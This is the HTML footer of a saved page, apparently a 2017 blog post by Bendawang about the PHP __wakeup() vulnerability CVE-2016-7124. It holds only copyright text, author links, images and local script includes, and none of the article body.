<a href="http://blog.csdn.net/qq_19876131"><img src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/bendawang2.png"/></a>
</div>
</div>
<div class="grid hide-on-mobiles">
<div class="unit one-third center-on-mobiles">
<div class="copyright">
          Copyright©
          <span itemprop="copyrightYear">2017</span>
<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
</div>
</div>
<div class="unit two-thirds align-right center-on-mobiles">
<p>Designed By
          <a href="http://blog.csdn.net/qq_19876131">
<img src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/bendawang2.png"/>
</a>
</p>
</div>
</div>
</footer>
<script src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/prism.js"></script>
<script src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/zooming.js"></script>
<script src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/Bendawang.js"></script>


